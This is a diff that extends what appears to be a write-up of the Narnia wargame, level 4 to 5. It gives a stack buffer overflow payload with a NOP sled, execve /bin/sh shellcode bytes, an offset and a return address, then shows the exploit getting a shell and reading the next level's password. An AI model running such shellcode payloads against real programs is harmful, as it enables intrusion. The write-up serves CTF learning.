@@ -125,6 +125,37 @@ thaenohtai
 thaenohtai
   
 ### level 4 -> 5
-
+This is actually same as level 2, all the things in the middle of the program isn't importent, what important is the unsafe copy from argv[1] to the buffer.  
+We will create same payload(NOPs + shellcode + return address that jump to the middle of the NOPs)  
+The steps of preparing the payload using gdb:   
+1. Find offset to override the return address - 264 bytes  
+2. Find some address in the middle of the NOPs - 0xffffd880
+3. Get shellcode - [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode
+4. Create the full payload - ```'\x90'*239 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x80\xd8\xff\xff'```
+```shell
+narnia4@narnia:/narnia$ ./narnia4 $(python -c "print('\x90'*239 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x80\xd8\xff\xff')")
+$ cat /etc/narnia_pass/narnia5
+faimahchiy
+```
 **password:**  
+faimahchiy
+
+### level 5 -> 6
+
+**password:**
+
+
+### level 6 -> 7
+
+**password:**
+
+
+### level 7 -> 8
+
+**password:**
+
+
+### level 8 -> 9
+
+**password:**
 
